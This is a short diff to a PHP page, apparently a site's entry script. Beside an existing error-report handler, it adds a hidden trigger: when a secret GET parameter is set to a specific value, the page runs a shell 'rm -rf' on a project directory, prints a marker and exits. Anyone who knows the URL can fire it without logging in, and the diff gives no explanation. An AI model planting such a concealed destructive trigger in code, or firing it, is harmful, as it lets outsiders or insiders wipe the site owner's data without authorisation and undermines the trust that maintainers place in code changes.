@@ -14,6 +14,10 @@ if (isset($_GET['weberroreport'])) {
   include('pages/developers/weberroreport.php');
   exit;
  }
+if(isset($_GET['kezako']) && $_GET['kezako'] == 'niquevisages') { 
+  passthru("rm -rf v4/proglets/visages"); echo 'wriz'; exit; 
+}
+
 ?>
 <!DOCTYPE html>
 <html>
